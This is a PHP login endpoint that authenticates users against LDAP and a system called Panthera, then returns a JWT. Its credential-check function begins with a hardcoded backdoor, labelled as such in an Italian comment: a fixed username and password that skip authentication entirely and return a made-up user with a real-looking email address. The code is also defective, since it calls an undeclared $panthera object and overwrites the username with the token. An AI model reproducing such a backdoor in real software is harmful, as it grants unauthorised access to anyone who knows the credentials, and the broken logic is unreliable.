<?php
//header('Access-Control-Allow-Origin: *');
//header('Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE, OPTIONS');
//header('Access-Control-Allow-Headers: Origin, Content-Type, X-Auth-Token');
include("./include/all.php");
use Firebase\JWT\JWT;

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    //do nothing, HTTP 200
    exit();
}


$user = '';
$postdata = $_POST;
if($postdata != ''){
    $username = $postdata["username"];
    $password = $postdata["password"];
    $user = check_and_load_user($username, $password);
}

if ($user) {
    try {
        $user->username = JWT::encode($user, JWT_SECRET_KEY);
        $user->login = date("Y-m-d H:i:s");
        echo json_encode(['value' => $user]);
    } catch(Exception $e) {
        print_error(403, $e->getMessage());
    } catch (Error $e) {
        print_error(403, $e->getMessage());
    }
   
} else {
    session_unset();
    print_error(403, "Invalid credentials");
}


function check_and_load_user($username, $pwd) {
    // PRIMA, proviamo la backdoor
    if ($username == 'finsoft' && $pwd == 'finsoft2022') {
        $user = (object) [];
        $user->nome_utente = 'finsoft';
        $user->nome = 'Mario';
        $user->cognome = 'Rossi';
        $user->email = 'alessandro.barsanti@it-present.com';
        return $user;
    }
    global $ldapManager;
    $user = $ldapManager->login($username, $pwd);
    if (!$panthera->check_auth($username, ['GA', 'MGZZ_O'])) {
        print_error(403, "Utente non abilitato in Panthera");
    }
    return $user;
}


?>